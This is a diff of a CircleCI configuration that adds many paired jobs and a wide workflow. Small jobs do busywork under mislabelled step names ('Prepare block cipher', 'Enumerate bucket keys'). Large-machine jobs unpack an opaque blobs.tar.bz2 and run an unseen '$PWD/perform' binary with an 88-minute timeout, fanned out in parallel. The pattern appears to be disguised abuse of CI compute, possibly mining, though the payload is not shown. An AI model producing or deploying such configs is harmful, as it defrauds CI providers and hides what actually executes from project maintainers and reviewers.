+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 23262); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/outbox/counts.json
+            echo "staging complete; file length=$(wc -c </tmp/outbox/counts.json)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - counts.json
+  sierra:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/counts.json > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  install_qi-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 204091 | awk 'END{print NR}'; true ; } > /tmp/outbox/handover.sig
+            echo "staging complete; file length=$(wc -c </tmp/outbox/handover.sig)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - handover.sig
+  qi-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/handover.sig > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  preinit_whiskey-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 5997); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/outbox/step-5.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-5.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-5.out
+  whiskey-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  dispatch_xi-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Prepare block cipher
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 20723); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/outbox/main_phase_output.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/main_phase_output.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - main_phase_output.txt
+  xi-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/step-4.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  postbuild_validte:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1331200 | wc -c; true ; } > /tmp/outbox/pt-v2.state
+            echo "staging complete; file length=$(wc -c </tmp/outbox/pt-v2.state)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - pt-v2.state
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+
+workflows:
+  all:
+    jobs:
+      - runner_feb6-rev
+      - feb6-rev:
+          requires:
+            - runner_feb6-rev
+      - prep_ruby3-lint:
+          requires:
+            - runner_feb6-rev
+      - ruby3-lint:
+          requires:
+            - prep_ruby3-lint
+      - green_BUILD_QA:
+          requires:
+            - prep_ruby3-lint
+      - BUILD_QA:
+          requires:
+            - green_BUILD_QA
+      - builder_add-login-leak:
+          requires:
+            - green_BUILD_QA
+      - add-login-leak:
+          requires:
+            - builder_add-login-leak
+      - go_preview:
+          requires:
+            - builder_add-login-leak
+      - preview:
+          requires:
+            - go_preview
+      - g2_feat-9685:
+          requires:
+            - go_preview
+      - feat-9685:
+          requires:
+            - g2_feat-9685
+      - install_qi-verify:
+          requires:
+            - g2_feat-9685
+      - qi-verify:
+          requires:
+            - install_qi-verify
+      - produce_sm-x:
+          requires:
+            - install_qi-verify
+      - sm-x:
+          requires:
+            - produce_sm-x
+      - B_titan-ng
+      - titan-ng:
+          requires:
+            - B_titan-ng
+      - redo_atlas-v2:
+          requires:
+            - B_titan-ng
+      - atlas-v2:
+          requires:
+            - redo_atlas-v2
+      - step2_q4-ship:
+          requires:
+            - redo_atlas-v2
+      - q4-ship:
+          requires:
+            - step2_q4-ship
+      - Delta_sierra:
+          requires:
+            - step2_q4-ship
+      - sierra:
+          requires:
+            - Delta_sierra
+      - phase1_DATA-412:
+          requires:
+            - Delta_sierra
+      - DATA-412:
+          requires:
+            - phase1_DATA-412
+      - bake_sep15-smoke:
+          requires:
+            - phase1_DATA-412
+      - sep15-smoke:
+          requires:
+            - bake_sep15-smoke
+      - step1_node18-test
+      - go_uniform
+      - alpha_v9-ga
+      - node18-test:
+          requires:
+            - step1_node18-test
+            - go_uniform
+            - alpha_v9-ga
+      - uniform:
+          requires:
+            - step1_node18-test
+            - go_uniform
+            - alpha_v9-ga
+      - v9-ga:
+          requires:
+            - step1_node18-test
+            - go_uniform
+            - alpha_v9-ga
+      - polaris-beta:
+          requires:
+            - step1_node18-test
+            - go_uniform
+            - alpha_v9-ga
+      - LAB_CHECK_3:
+          requires:
+            - step1_node18-test
+            - go_uniform
+            - alpha_v9-ga
+      - xi-verify:
+          requires:
+            - step1_node18-test
+            - go_uniform
+            - alpha_v9-ga
+      - postbuild_validte
+      - hook_november
+      - canary_ValidateService
+      - validte:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - november:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - ValidateService:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - whiskey-9:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - may9-rev:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - brodcast:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - victor-5:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - bake-it:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - papa-8:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
+      - rocket:
+          requires:
+            - postbuild_validte
+            - hook_november
+            - canary_ValidateService
